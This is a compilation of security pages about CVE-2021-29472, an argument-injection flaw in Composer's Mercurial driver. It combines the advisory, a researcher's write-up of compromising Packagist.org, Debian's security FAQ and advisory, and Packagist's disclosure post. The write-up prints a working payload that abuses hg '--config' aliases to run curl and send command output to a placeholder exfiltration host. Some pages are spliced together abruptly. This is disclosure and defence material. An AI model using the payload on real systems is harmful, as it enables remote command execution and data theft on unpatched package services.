# Missing argument delimiter can lead to command execution via VCS repository URLs or source download URLs on systems with Mercurial

High

[Seldaek](/Seldaek)
published
GHSA-h5h8-pc6h-jvvx
Apr 27, 2021

## Package

composer

composer/composer
([Composer](/advisories?query=ecosystem%3Acomposer))

## Affected versions

<1.10.22 || >=2.0,<2.0.13

## Patched versions

1.10.22, 2.0.13

## Description

URLs for Mercurial repositories in the root composer.json and package source download URLs are not sanitized correctly. Specifically crafted URL values allow commands to be executed in the HgDriver if hg/Mercurial is installed on the system.

### Impact

* The impact to Composer users directly is limited as the composer.json file is typically under their own control and source download URLs can only be supplied by third party Composer repositories they explicitly trust to download and execute source code from, e.g. Composer plugins.
* The main impact is to services passing user input to Composer, including Packagist.org and Private Packagist. This allowed users to trigger remote command injection. The vulnerability has been patched on Packagist.org and Private Packagist within 12h of receiving the initial vulnerability report and based on a review of logs, to the best of our knowledge, was not abused by anyone.
* Other services/tools using VcsRepository/VcsDriver or derivatives may also be vulnerable and should upgrade their composer/composer dependency immediately

### Patches

1.10.22 and 2.0.13 include patches for this issue.

### Severity

High

### CVE ID

CVE-2021-29472

### Weaknesses

[CWE-141](/advisories?query=cwe%3A141)

![](data:image/svg+xml;charset=utf-8...)![We recently discovered a vulnerability in Composer, the main package manager for PHP, and were able to use it to take over the central repository, packagist.org.](https://assets-eu-01.kc-usercontent.com:443/95361965-6528-012b-61fc-b49456de9702/581c73b8-2b6e-4c61-94c1-2303689d6f96/cover-467458c0-61ba-41e5-ad9c-caf6910e9413_php.png?w=1201&h=601&auto=format&fit=crop)![We recently discovered a vulnerability in Composer, the main package manager for PHP, and were able to use it to take over the central repository, packagist.org.](https://assets-eu-01.kc-usercontent.com:443/95361965-6528-012b-61fc-b49456de9702/581c73b8-2b6e-4c61-94c1-2303689d6f96/cover-467458c0-61ba-41e5-ad9c-caf6910e9413_php.png?w=1201&h=601&auto=format&fit=crop)

Supply chain attacks are a hot topic for development organizations today. Last year, in the largest ever software supply chain attack, 18,000 SolarWinds customers were infected with a backdoor. Earlier this year, a security researcher was able to breach Apple, Microsoft, Paypal and other tech giants using a new supply chain attack technique. The underlying problem exploited by these attacks is that all modern software is built on top of other, third-party software components, often without clear visibility on all the downloaded packages. And while reusing many components allows to speed up the development process, infecting the supply chain is a very effective and subtle attack vector to compromise many organizations at once.

In the PHP ecosystem, Composer is *the* major tool to manage and install software dependencies. It is used by development teams world-wide to ease the update process and to ensure that applications work effortless across environments and versions. For this purpose, Composer uses an online service named *Packagist*that determines the correct supply chain for package downloads. Within only one month, the public Packagist infrastructure serves around [1.4 billion](https://packagist.org/statistics "1.4 billion") download requests!

During our security research, we discovered a critical vulnerability in the [source code](https://github.com/composer/packagist "source code") of Composer which is used by Packagist. It allowed us to execute arbitrary system commands on the Packagist.org server. A vulnerability in such a central component, serving more than 100M package metadata requests per month, has a huge impact as this access could have been used to steal maintainers’ credentials or to redirect package downloads to third-party servers delivering backdoored dependencies.

In this blog post, we introduce the detected code vulnerabilities and how these were patched. Some of the vulnerable code is present since the first versions of Composer, 10 years ago. For instance one of the bugs we’ll detail was introduced [in November 2011](https://github.com/composer/composer/blame/ee4d4ee3fae26b87dbfca2b9fba8146dd1f04a50/src/Composer/Repository/Vcs/HgDriver.php#L182 "in November 2011"). After discovery, we reported all issues to the Packagist team who quickly deployed a fix within only 12 hours and assigned [CVE-2021-29472](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29472 "CVE-2021-29472"). To the best of their knowledge the vulnerability has not been exploited ([see their blog post](https://blog.packagist.com/composer-command-injection-vulnerability/ "see their blog post")).

Update: [this article has been nominated at the Pwnie Awards](https://pwnies.com/supply-chain-attack-on-composer/ "this article has been nominated at the Pwnie Awards") (an "annual awards ceremony celebrating the achievements and failures of security researchers and the security community") in the category *Most Under-Hyped Research*!

## Technical Details

When asked to download a package, Composer will first query Packagist to obtain its metadata (e.g. [here for Composer itself](https://repo.packagist.org/p2/composer/composer.json "here for Composer itself")). This metadata contains, among others and for each version, two fields about where to fetch the code from: source, pointing to the development repository and dist, pointing to pre-built archives. Composer will use external system commands to avoid re-implementing the logic specific to each version control software (VCS) when downloading code from repositories. For this purpose, such calls are performed by using the wrapper `ProcessExecutor`:

[**composer/src/Composer/Util/ProcessExecutor.php**](https://github.com/composer/composer/blob/master/src/Composer/Util/ProcessExecutor.php "composer/src/Composer/Util/ProcessExecutor.php")

```
use Symfony\Component\Process\Process;
// [...]
class ProcessExecutor
{
    // [...]
    public function execute($command, &$output = null, $cwd = null)
    {
        if (func_num_args() > 1) {
            return $this->doExecute($command, $cwd, false, $output);
        }
        return $this->doExecute($command, $cwd, false);
    }
    // [...]
    private function doExecute($command, $cwd, $tty, &$output = null)
    {
        // [...]
        if (method_exists('Symfony\Component\Process\Process', 'fromShellCommandline')) {
            // [1]
            $process = Process::fromShellCommandline($command, $cwd, null, null, static::getTimeout());
        } else {
            // [2]
            $process = new Process($command, $cwd, null, null, static::getTimeout());
        }
        if (!Platform::isWindows() && $tty) {
            try {
                $process->setTty(true);
            } catch (RuntimeException $e) {
                // ignore TTY enabling errors
            }
        }
        $callback = is_callable($output) ? $output : array($this, 'outputHandler');
        $process->run($callback);
```

At `[1]`and `[2]`, we can see that the parameter `$command` is executed in a shell by `Symfony\Component\Process\Process`. Most `ProcessExecutor` calls are performed in VCS drivers that are responsible for any operation on remote and local repositories (cloning, extracting information, etc), like for instance in the Git driver:

[**composer/src/Composer/Repository/Vcs/GitDriver.php**](https://github.com/composer/composer/blob/e7f6dd287ca7f529d7aedb8249a60444d945affc/src/Composer/Repository/Vcs/GitDriver.php#L204-L241 "composer/src/Composer/Repository/Vcs/GitDriver.php")

```
public static function supports(IOInterface $io, Config $config, $url, $deep = false)
{
    if (preg_match('#(^git://|\.git/?$|git(?:olite)?@|//git\.|//github.com/)#i', $url)) {
        return true;
    }
    // [...]
    try {
        $gitUtil->runCommand(function ($url) {
            return 'git ls-remote --heads ' . ProcessExecutor::escape($url); // [1]
        }, $url, sys_get_temp_dir());
    } catch (\RuntimeException $e) {
        return false;
    }
```

While the argument `$url` is escaped using `ProcessExecutor::escape()` to prevent the evaluation of subcommands (`$(...)`, ``...``) by the shell, nothing will prevent the user from providing a value starting with dashes (`--`) and appending extra arguments to the final command. This type of vulnerability is called *Parameter* or *Argument Injection*.

The same vulnerable pattern can be found in all the other drivers, where user-controlled data is correctly escaped but concatenated to a system command:

[**composer/src/Composer/Repository/Vcs/SvnDriver.php**](https://github.com/composer/composer/blob/cda6e8bea63bd0ab73c7cd6be6c2016d32c141ec/src/Composer/Repository/Vcs/SvnDriver.php#L299-L337 "composer/src/Composer/Repository/Vcs/SvnDriver.php")

```
public static function supports(IOInterface $io, Config $config, $url, $deep = false)

Argument injection bugs are a really cool class of bugs that tend to be often overlooked during code reviews, and completely missed in black-box engagements. While it is known that user-controlled values should be correctly neutralized using `escapeshellarg()`, there is no warning that they could still be treated as options.

However, it is very unlikely that we can force a user to point Composer to an arbitrary URL under the attacker's control. Worst: if we can already do so, it would be way easier to publish our own malicious package and force Composer to pull it on target’s server. Do we have a useless bug here?

### Compromising packagist.org

Just in case you are not familiar with the PHP packaging ecosystem, your project becomes a package as soon you add a file named `composer.json` in the top directory. Then, you only need to create an account on packagist.org, submit your repository URL and it will automatically fetch your project, parse your `composer.json` and create the associated package if everything went well: your package is now public, visible on Packagist and can be installed by anybody!

Packagist.org will rely on composer’s API (it can be used as a CLI tool or directly using an API) to fetch the package during creation, thus supporting various VCS like Git, Subversion, Mercurial, etc. As you can see in [`packagist/src/Entity/Package.php`](https://github.com/composer/packagist/blob/efcd1cfed59fa2673faa74748b9e388245c58633/src/Entity/Package.php#L606-L657 "packagist/src/Entity/Package.php"), it will do the following actions:

[**packagist/src/Entity/Package.php**](https://github.com/composer/packagist/blob/efcd1cfed59fa2673faa74748b9e388245c58633/src/Entity/Package.php#L606-L657 "packagist/src/Entity/Package.php")

```
$io = new NullIO();
$config = Factory::createConfig();
$io->loadConfiguration($config);
$httpDownloader = new HttpDownloader($io, $config);
$repository = new VcsRepository(['url' => $this->repository], $io, $config, $httpDownloader); // [1]

$driver = $this->vcsDriver = $repository->getDriver(); // [2]
if (!$driver) {
    return;
}

$information = $driver->getComposerInformation($driver->getRootIdentifier());
if (!isset($information['name'])) {
    return;
}

if (null === $this->getName()) {
    $this->setName(trim($information['name']));
}
```

The class `VcsRepository` (`[1]`) [comes from Composer,](https://github.com/composer/composer/blob/master/src/Composer/Repository/VcsRepository.php#L59 "comes from Composer,") and the call to `getDriver()` (`[2]`) will trigger calls to methods `supports()` and `initialize()` of the following VCS “drivers”:

* `GitHubDriver`
* `GitLabDriver`
* `GitBitbucketDriver`
* `GitDriver`
* `HgBitbucketDriver`
* `HgDriver`
* `PerforceDriver`
* `FossilDriver`
* `SvnDriver`

Sounds familiar? These classes are where we found argument injection bugs!

### Exploitation time!

We don’t often discuss exploitation details to avoid any malicious mass-exploitation quickly after our blog posts, but we feel like this Composer bug will only have a limited impact by itself. Still, if you happen to use composer and `VcsRepository` with user-controlled URLs or if you have your own Packagist instance, make extra sure to upgrade.

As all drivers are basically vulnerable, we decided to look for the easiest one to exploit. Argument injection on git is fairly documented (`--upload-pack`, `--output`), but git ls-remote here expects one positional argument, but we can’t provide both `--upload-pack` and a positional argument as our value is surrounded by single quotes. We were not able to identify a way to gain code execution with it, and then looked at the other drivers.

While playing with the Mercurial client (`hg`) and reading [its manual](https://www.mercurial-scm.org/doc/hgrc.5.html "its manual") we noticed the presence of a flag named `--config`, allowing us to load new configuration directives to the client before performing any action. The client supports the alias setting, with a very promising description:

*It is possible to create aliases with the same names as existing commands, which will then override the original definitions. This is almost always a bad idea!*

*An alias can start with an exclamation point (!) to make it a shell alias. A shell alias is executed with the shell and will let you run arbitrary commands. As an example,*

*echo = !echo $@*

That’s perfect for us: we will alias the command identify to a shell command of our choice, and `hg` will happily execute it for us instead of looking for a remote repository. Our final payload looked like the following:

```
--config=alias.identify=!curl http://exfiltration-host.tld --data “$(ls -alh)”
```

After submitting a new package with this URL on packagist.org, we indeed received the following HTTP request body from an AWS host:

```
total 120K
drwxrwxr-x  9 composer composer 4.0K Apr 21 23:19 .

```

This was enough to confirm that we obtained command execution; we promptly notified `security (at) packagist.org` and did not try to elevate privileges.

## Patch

The maintainers quickly (< 12 hours) deployed a hotfix in production, effectively preventing the exploitation of this vulnerability. [Composer fixes](https://github.com/composer/composer/commit/332c46af8bebdead80a2601350dff7af0ac1f490 "Composer fixes") were pushed on April, 27th and releases 1.10.22 / 2.0.13 were published right after. [Packagist is now using the up-to-date version of Composer](https://github.com/composer/packagist/commit/8ad7b8b1274d5453684399456de48b5b07372879 "Packagist is now using the up-to-date version of Composer").

As for most argument injection vulnerabilities, the fix consists of only two characters: --. [POSIX specifies that](https://pubs.opengroup.org/onlinepubs/9699919799/basedefs/V1_chap12.html "POSIX specifies that"):

*The first****--****argument that is not an option-argument should be accepted as a delimiter indicating the end of options. Any following arguments should be treated as operands, even if they begin with the '-' character.*

If you try to reproduce the vulnerabilities at home, you may notice that fossil only recently [improved support for this feature](https://fossil.umaneti.net/fossil/vdiff?branch=double-dash-flag2 "improved support for this feature"). We did not pursue this exploitation scenario, but it could have an interesting impact on environments in which fossil 2.11 is not yet available (e.g. Debian Buster).

## Summary

We demonstrated how a seemingly innocuous bug in Composer could impact services such as Packagist.org. Researchers like Max Justicz regularly discover security issues in package managers and the [associated](https://justi.cz/security/2021/04/20/cocoapods-rce.html%2C "associated") [services](https://justi.cz/security/2019/01/22/apt-rce.html "services"), and their impact is potentially considerable. Companies need to spend more effort on auditing tools in their supply chain, and provide additional expertise [on tickets related to code signing](https://github.com/composer/composer/issues/6941 "on tickets related to code signing") and to the reduction of the impact of such attacks.

It should be noted that the maintainers did not identify any sign of prior exploitation of this vulnerability on the public packagist instance. As this software can also be installed on-premise, [they still advise to look for potential exploitation leftovers](https://blog.packagist.com/composer-command-injection-vulnerability/ "they still advise to look for potential exploitation leftovers") by looking for URLs starting by --config in your composer.lock file.

While this bug is quite old and easy to identify, it could have been missed because easier vulnerabilities were lying around, [like the one already discovered by Max Justicz on Packagist in 2018](https://justi.cz/security/2018/08/28/packagist-org-rce.html%29 "like the one already discovered by Max Justicz on Packagist in 2018"). Parameter injection on VCS tools are the speciality of a few researchers like [@\_staaldraad](https://twitter.com/_staaldraad "@_staaldraad") ([CVE-2019-13139 - Docker build code execution](https://staaldraad.github.io/post/2019-07-16-cve-2019-13139-docker-build/ "CVE-2019-13139 - Docker build code execution")), [@joernchen](https://twitter.com/joernchen "@joernchen") ([CVE-2018-17456 - Git Submodule RCE](https://gist.github.com/joernchen/38dd6400199a542bc9660ea563dcf2b6 "CVE-2018-17456 - Git Submodule RCE")), [@wcbowling](https://twitter.com/wcbowling "@wcbowling") ([GitHub RCE](https://devcraft.io/2020/10/18/github-rce-git-inject.html "GitHub RCE"), [Gitlab RCE](https://hackerone.com/reports/658013 "Gitlab RCE")); we encourage you to take a look at their previous work to learn more about this bug class.

We’ll be happy to discuss these bugs [in our community forum thread!](https://community.sonarsource.com/t/new-security-research-supply-chain-attack-on-composer-wordpress-xxe-vulnerability/42505 "in our community forum thread!")

Finally, we would like to thank Jordi Boggiano and Nils Adermann of Packagist for their super fast fixes and the awesome work they do to maintain such a central piece of the PHP ecosystem.

When are those going to be fixed?](#cve-severity-assessment)- [What does local (remote) mean?](#localremote)

*Q: I received a DSA via debian-security-announce, how can I upgrade the vulnerable packages?*

A: As the DSA mail says, you should upgrade the packages affected by the
announced vulnerability. You can do this by just upgrading (after
updating the list of available packages with apt-get update)
every package in your system with apt-get upgrade or by
upgrading just a particular package, with apt-get install
*package*.

The announcement mail mentions the source package in which the vulnerability
was present. Therefore, you should update all the binary packages from
that source package. To check the binary packages to update, visit
https://packages.debian.org/src:*source-package-name* and
click on *[show ... binary packages]* for the distribution you
are updating.

It may also be necessary to restart a service or a running process. The
command [checkrestart](https://manpages.debian.org/checkrestart)
included in the package
[debian-goodies](https://packages.debian.org/debian-goodies)
might help to find which ones.

*Q: The signature on your advisories does not verify correctly!*

A: This is most likely a problem on your end. The
[debian-security-announce](https://lists.debian.org/debian-security-announce/)
list has a filter that only allows messages with a correct signature
from one of the security team members to be posted.

Most likely some piece of mail software on your end slightly changes
the message that breaks the signature. Make sure your software does
not do any MIME encoding or decoding, or tab/space conversions.

Known culprits are fetchmail (with the mimedecode option enabled),
formail (from procmail 3.14 only) and evolution.

*Q: How is security handled in Debian?*

A: Once the security team receives a notification of an incident,
one or more members review it and consider its impact on the stable
release of Debian (i.e. if it's vulnerable or not).
If our system is vulnerable, we work on a fix for the
problem. The package maintainer is contacted as well, if they didn't
contact the security team already. Finally, the fix is tested and
new packages are prepared, which are then compiled on all stable
architectures and uploaded afterwards. After all of that is done,
an advisory is published.

*Q: Why are you fiddling with an old version of that package?*

The most important guideline when making a new package that fixes a
security problem is to make as few changes as possible. Our users and
developers are relying on the exact behaviour of a release once it is made,
so any change we make can possibly break someone's system. This is
especially true in case of libraries: make sure you never change the
Application Program Interface (API) or Application Binary Interface (ABI),
no matter how small the change is.

This means that moving to a new upstream version is not a good solution,
instead the relevant changes should be backported. Generally upstream
maintainers are willing to help if needed, if not the Debian security team
might be able to help.

In some cases it is not possible to backport a security fix, for example
when large amounts of source code need to be modified or rewritten. If that
happens it might be necessary to move to a new upstream version, but this
has to be coordinated with the security team beforehand.

*Q: The version number for a package indicates that I am still running
a vulnerable version!*

A: Instead of upgrading to a new release we backport security fixes to
the version that was shipped in the stable release. The reason we do
this is to make sure that a release changes as little as possible
so things will not change or break unexpectedly as a result of a
security fix. You can check if you are running a secure version of
a package by looking at the package changelog, or comparing its
exact version number with the version indicated in the Debian
Security Advisory.

*Q: I received an advisory, but the build for one
processor architecture seems to be missing.*

A: Generally the Security Team releases an advisory with builds of the updated
packages for all architectures that Debian supports. However, some architectures
are slower than others and it may happen that builds for most architectures
are ready while some are still missing. These smaller archs represent a small
fraction of our user base. Depending on the urgency of the issue
we may decide to release the advisory forthwith. The missing builds will be
installed as soon as they come available, but no further notice of this will
be given. Of course we will never release an advisory where the i386 or amd64
builds are not present.

*Q: How is security handled for unstable?*

A: Security for unstable is primarily handled by package maintainers, not
by the Debian Security Team. Although the security team may upload
high-urgency security-only fixes when maintainers are noticed to be
inactive, support for stable will always have priority.
If you want to have a secure (and stable) server you are strongly encouraged
to stay with stable.

*Q: How is security handled for testing?*

A: Security for testing benefits from the security efforts of the entire
project for unstable. However, there is a minimum two-day migration delay,
and sometimes security fixes can be held up by transitions. The Security
Team helps to move along those transitions holding back important
security uploads, but this is not always possible and delays may occur.
Especially in the months after a new stable release, when many new versions
are uploaded to unstable, security fixes for testing may lag behind.
If you want to have a secure (and stable) server you are strongly
encouraged to stay with stable.

*Q: How is security handled for contrib,
non-free and non-free-firmware?*

A: The short answer is: it's not. Contrib, non-free and non-free-firmware aren't official
parts of the Debian Distribution and are not released, and thus not
supported by the security team. Some non-free packages are distributed
without source or without a license allowing the distribution of modified
versions. In those cases no security fixes can be made at all. If it
is possible to fix the problem, and the package maintainer or someone else
provides correct updated packages, then the security team will generally
process them and release an advisory.

*Q: The advisory says unstable is fixed in
version 1.2.3-1, but unstable has 1.2.5-1, what's up?*

A: We try to list the first version in unstable that fixed the problem.
Sometimes the maintainer has uploaded even newer versions in the meantime.
Compare the version in unstable with the version we indicate. If it's the
same or higher, you should be safe from this vulnerability. If you want to
be sure, you can check the package changelog with apt-get changelog
package-name and search for the entry announcing the fix.

*Q: Why are there no official mirrors for security.debian.org?*

A: Actually, there are. There are several official mirrors, implemented
through DNS aliases. The purpose of security.debian.org is to make security
updates available as quickly and easily as possible.

Encouraging the use of unofficial mirrors would add extra complexity
that is usually not needed and that can cause frustration if these
mirrors are not kept up to date.

*Q: I've seen DSA 100 and DSA 102, now where is DSA 101?*

A: Several vendors (mostly of GNU/Linux, but also of BSD
derivatives) coordinate security advisories for some incidents and
agree to a particular timeline so that all vendors are able to
release an advisory at the same time. This was decided in order to
not discriminate some vendors that need more time (e.g. when the
vendor has to pass packages through lengthy QA tests or has to
support several architectures or binary distributions). Our own
security team also prepares advisories in advance. Every now and
then, other security issues have to be dealt with before the parked
advisory could be released, and hence temporarily leaving out one or
more advisories by number.

*Q: How can I reach the security team?*

A: Security information can be sent to security@debian.org or
team@security.debian.org, both of which are read by the members of
the security team.

If desired, email can be encrypted with the Debian Security
Contact key (key ID [0x0D59D2B15144766A14D241C66BAF400B05C3E651](https://keyserver.ubuntu.com/pks/lookup?op=get&search=0x0d59d2b15144766a14d241c66baf400b05c3e651)). For the OpenPGP keys of individual team members, please
refer to the [keyring.debian.org](https://keyring.debian.org/)
keyserver.

*Q: I guess I found a security problem, what should I do?*

A: If you learn about a security problem, either in one of your own
packages or in someone else's please always contact the security team. If
the Debian security team confirms the vulnerability and other vendors are
likely to be vulnerable as well, they usually contact other vendors as
well. If the vulnerability is not yet public they will try to coordinate
security advisories with the other vendors, so all major distributions are
in sync.

If the vulnerability is already publicly known, be sure to file a bug
report in the Debian BTS, and tag it security.

If you are a Debian maintainer, [see below](#care).

*Q: What am I supposed to do with a security problem in one of
my packages?*

A: If you learn of a security problem, either in your package or
someone else's please always contact the security team via email at
team@security.debian.org. They keep track
of outstanding security problems, can help maintainers with
security problems or fix problems on their own, are responsible for
sending out security advisories and maintaining
security.debian.org.

The [Developer's Reference](../doc/developers-reference/pkgs.html#bug-security) has complete instructions on what to do.

It's particularly important that you don't upload to any other
distribution other than unstable without prior agreement by the
security team, because bypassing them will cause confusion and more
work.

*Q: I tried to download a package listed in one of the security
advisories, but I got a `file not found' error.*

A: Whenever a newer bugfix supersedes an older package on
security.debian.org, chances are high that the old package will be
removed by the time the new one gets installed. Hence, you'll get
this `file not found' error. We don't want to distribute packages
with known security bugs longer than absolutely necessary.

Please use the packages from the latest security advisories, which are
distributed through the [debian-security-announce](https://lists.debian.org/debian-security-announce/) mailing list. It's best to simply run
`apt-get update` before upgrading the package.

*Q: I've got a bugfix, can I upload to security.debian.org directly?*

A: No, you can't. The archive at security.debian.org is maintained
by the security team, who have to approve all packages. You should
instead send patches or proper source packages to the security team
via team@security.debian.org. They will be
reviewed by the security team and eventually uploaded, either with
or without modifications.

The [Developer's Reference](../doc/developers-reference/pkgs.html#bug-security) has complete instructions on what to do.

*Q: I've got a bugfix, can I upload to proposed-updates instead?*

A: Technically speaking, you can. However, you should not do this,
since this interferes badly with the work of the security team.
Packages from security.debian.org will be copied into the
proposed-updates directory automatically. If a package with the
same or a higher version number is already installed into the
archive, the security update will be rejected by the archive
system. That way, the stable distribution will end up without a
security update for this package instead, unless the wrong
packages in the proposed-updates directory were rejected. Please contact the
security team instead and include all details of the vulnerability
and attach the source files (i.e. diff.gz and dsc files) to your mail.

The [Developer's Reference](../doc/developers-reference/pkgs.html#bug-security) has complete instructions on what to do.

*Q: I'm pretty sure my packages are fine,
how can I upload them?*

A: If you are very sure that your packages don't break anything, that the
version is sane (i.e. greater than the version in stable and less than the
version in testing/unstable), that you didn't change the behaviour of the
package, despite the corresponding security problem, that you compiled it
for the correct distribution (that is `oldstable-security` or
`stable-security`), that the package contains the original
source if the package is new on security.debian.org, that you can confirm
the patch against the most recent version is clean and only touches the
corresponding security problem (check with `interdiff -z` and
both `.diff.gz` files), that you have proofread the patch at
least thrice, and that `debdiff` doesn't display any changes,
you may upload the files into the incoming directory
`ftp://ftp.security.upload.debian.org/pub/SecurityUploadQueue` on the
security.debian.org directly. Please send a notification with all details
and links to team@security.debian.org as well.

*Q: How can I help with security?*

A: Please review each problem before reporting it to
security@debian.org. If you are able to provide patches, that
would speed up the process. Do not simply forward bugtraq mails,
because we already receive them — but do provide us with
additional information about things reported on bugtraq.

A good way to get started with security work is helping
out on the Debian Security Tracker ([instructions](https://security-tracker.debian.org/tracker/data/report)).

*Q: What is the scope of proposed-updates?*

A: This directory contains packages which are proposed to enter the
next revision of Debian stable. Whenever packages are uploaded by
a maintainer for the stable distribution, they end up in the
proposed-updates directory. Since stable is meant to be stable, no
automatic updates are made. The security team will upload fixed
packages mentioned in their advisories to stable, however they will
be placed in proposed-updates first. Every couple of months the
Stable Release Manager checks the list of packages in
proposed-updates and discusses whether a package is suited for
stable or not. This is compiled into another revision of stable
(e.g. 2.2r3 or 2.2r4). Packages that don't fit will probably be
rejected and dropped from proposed-updates as well.

Note that the packages uploaded by maintainers (not by the security team)
in the proposed-updates/ directory are not supported by the security
team.

*Q: How is the security team composed?*

A: The Debian security team consists of
[several officers and secretaries](../intro/organization#security).
The security team itself appoints people to join the team.

*Q: How long will security updates be provided?*

A: The security team will support a stable distribution for
three years after its release. It is not possible to support three
distributions; supporting two simultaneously is already difficult
enough.

*Q: How can I check the integrity of packages?*

A: This process involve checking the Release file signature against
the [public key](https://ftp-master.debian.org/keys.html) used for the archive. The Release file contains the
checksums of Packages and Sources files, which contain
checksums of binary and source packages. Detailed instruction on how
to check packages integrity can be found in the [Debian Securing Manual](../doc/manuals/securing-debian-howto/ch7#s-deb-pack-sign).

*Q: What to do if a random package breaks after a security update?*

A: First of all, you should figure out why the package breaks and
how it is connected to the security update, then contact the
security team if it is serious or the stable release manager if it
is less serious. We're talking about random packages that break
after a security update of a different package. If you can't
figure out what's going wrong but have a correction, talk to the
security team as well. You may be redirected to the stable release
manager though.

*Q: What is a CVE identifier?*

A: The Common Vulnerabilities and Exposures project assignes
unique names, called CVE identifiers, to specific security
vulnerabilities, to make it easier to uniquely refer to a specific
issue. More information can be found at [Wikipedia](https://en.wikipedia.org/wiki/Common_Vulnerabilities_and_Exposures).

*Q: Does Debian issue a DSA for every CVE id?*

A: The Debian security team keeps track of every issued CVE identifier,
connect it to the relevant Debian package and assess its impact in a
Debian context - the fact that something is assigned a CVE id does not
necessarily imply that the issue is a serious threat to a Debian system.
This information is tracked in the
[Debian Security Tracker](https://security-tracker.debian.org)
and for the issues that are considered serious a Debian Security Advisory
will be issued.

Low-impact issues not qualifying for a DSA can be fixed in the next
release of Debian, in a point release of the current stable or oldstable
distributions, or are included in a DSA when that is being issued for a
more serious vulnerability.

*Q: Can Debian assign CVE identifiers?*

A: Debian is a CVE Numbering Authority and can assign ids, but per
CVE policy only to yet-undisclosed issues. If you have an undisclosed
security vulnerability for software in Debian and would like to get an
identifier for it, contact the Debian Security Team. For cases where the
vulnerability is already public, we advise to follow the procedure
detailed in the [CVE OpenSource Request HOWTO](https://github.com/RedHatProductSecurity/CVE-HOWTO).

*Q: Does Debian have a vulnerability disclosure policy?*

A: Debian has published a [vulnerability
disclosure policy](disclosure-policy) as part of its participation in the CVE
program.

*Q: Our vulnerability management tool
has shown that the following issues are open (list of CVEs with random CVSS
scores). When are those going to be fixed?*

A: Debian does not provide CVSS scores and doesn't use CVSS scores from
external sources when triaging security issues.

You can check the state of every single CVE ID in the Debian Security Tracker by accessing
it by [ID](https://security-tracker.debian.org/tracker/CVE-ID).

The "Notes" section will contain additional information, e.g. that a security issue doesn't
warrant a Debian security update, but might get fixed in a subsequent point release.

A list of packages for which a Security update is planned can be found at the
[dsa-needed list](https://salsa.debian.org/security-tracker-team/security-tracker/raw/master/data/dsa-needed.txt).

If you find an error in triage data, you're very welcome to report it. The Debian Security Team will
however not generally react to requests asking for more specific information, you should instead contact
the vendor of your vulnerability management tool, after all they are the ones who alerted you about a
security issue and not Debian.

# Deprecated Debian security FAQ

*Q: What does local (remote) mean?*

**The field *Problem type* in DSA mails is not used since April 2014.**

A: Some advisories cover vulnerabilities that cannot be identified
with the classic scheme of local and remote exploitability. Some
vulnerabilities cannot be exploited from remote, i.e. don't
correspond to a daemon listening to a network port. If they can be
exploited by special files that could be provided via the network
while the vulnerable service is not permanently connected with the
network, we write local (remote) in such cases.

Such vulnerabilities are somewhat between local and remote
vulnerabilities and often cover archives that could be provided
through the network, e.g. as mail attachment or from a download
page.

Package        : composer
CVE ID         : CVE-2021-29472

It was discovered that composer, a dependency manager for PHP, did not
properly sanitize Mercurial URLs, which could lead to arbitrary code
execution.

For the stable distribution (buster), this problem has been fixed in
version 1.8.4-1+deb10u1.

We recommend that you upgrade your composer packages.

For the detailed security status of composer please refer to
its security tracker page at:

# Composer Command Injection Vulnerability

* [![Nils Adermann](//www.gravatar.com/avatar/dc5728eadcbd629aa6b14f3d47148968?s=250&d=mm&r=x)](/author/naderman/)

**Please immediately update Composer to version [2.0.13](https://github.com/composer/composer/releases/tag/2.0.13) or [1.10.22](https://github.com/composer/composer/releases/tag/1.10.22)** (`composer.phar self-update`).The new releases include fixes for a [command injection security vulnerability](https://github.com/composer/composer/security/advisories/GHSA-h5h8-pc6h-jvvx) ([CVE-2021-29472](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29472)) reported by Thomas Chauchefoin from [SonarSource](https://sonarsource.com).

**Fixes for Packagist.org and Private Packagist were deployed** within 12 hours of receiving the report of remote command execution on April 22nd, 2021.

**To the best of our knowledge the vulnerability has not been exploited**

---

## Cause of the Vulnerability

URLs for repositories in root composer.json files and package source download URLs were not sanitized sufficiently and could be interpreted as options for system commands executed by Composer (parameter injection). This problem alone does not yet allow command execution, as the values are appropriately escaped. The parameter injection has been fixed all across Composer with help by Thomas Chauchefoin from [SonarSource](https://sonarsource.com) by separating positional command arguments from options with the `--` separator where possible, e.g. `hg clone -- '$URL'` instead of `hg clone '$URL'`.

Because Mercurial's commands offer a `--config` option to temporarily override configuration values, and because alias configuration allows redefining Mercurial subcommands to arbitrary system commands, a value can be crafted allowing system commands to be executed in the HgDriver if Mercurial (executable called "hg") is installed on the system.

So systems which do not have Mercurial installed are safe from this particular vulnerability.

## Impact on Packagist.org and Private Packagist

Both Packagist.org and Private Packagist were theoretically vulnerable to an attack with package URLs crafted to trigger Mercurial to execute system commands. Based on a review of logs, and an audit of database contents we do not believe this vulnerability to have been exploited on either of our services.

For our self-hosted product Private Packagist Enterprise we have made version 1.10.6 available with the updated Composer version. After installing the update you can run the command `replicated admin audit --vulnerability=CVE-2021-29472` to check for any compromising packages or processed jobs. Further details on analyzing your installation for integrity are available through the release notification or upon request from our support at contact@packagist.com.

## Recommended Steps

As a precaution after updating Composer we recommend you audit your composer.lock files to ensure they only contain URLs and none which start with `--` , e.g. `--config` and could be considered command line options. Should you find any such URL values despite our belief that this vulnerability was not exploited in the wild, please contact us immediately by email to security@packagist.org.

In general we always recommend you review changes you make to your lock files to ensure no untrusted dependencies or external URLs are introduced to your application. Please note that Packagist.org is only a metadata server and package contents are downloaded from a location chosen by the package maintainers. Private Packagist will store copies of mirrored package contents, so Composer can download them from there, but the lock files will still contain the maintainers' original URLs for reference and as a fallback.

If you maintain a service passing user input to Composer, apart from updating Composer immediately, you may wish to add your own validation for user input before passing it to Composer, e.g. add validation of URLs.

| [Description](show_bug.cgi?id=1955727#c0)  Pedro Sampaio    2021-04-30 17:41:23 UTC  ``` Composer is a dependency manager for PHP. URLs for Mercurial repositories in the root composer.json and package source download URLs are not sanitized correctly. Specifically crafted URL values allow code to be executed in the HgDriver if hg/Mercurial is installed on the system. The impact to Composer users directly is limited as the composer.json file is typically under their own control and source download URLs can only be supplied by third party Composer repositories they explicitly trust to download and execute source code from, e.g. Composer plugins. The main impact is to services passing user input to Composer, including Packagist.org and Private Packagist. This allowed users to trigger remote code execution. The vulnerability has been patched on Packagist.org and Private Packagist within 12h of receiving the initial vulnerability report and based on a review of logs, to the best of our knowledge, was not abused by anyone. Other services/tools using VcsRepository/VcsDriver or derivatives may also be vulnerable and should upgrade their composer/composer dependency immediately. Versions 1.10.22 and 2.0.13 include patches for this issue.

# Debian Long Term Support

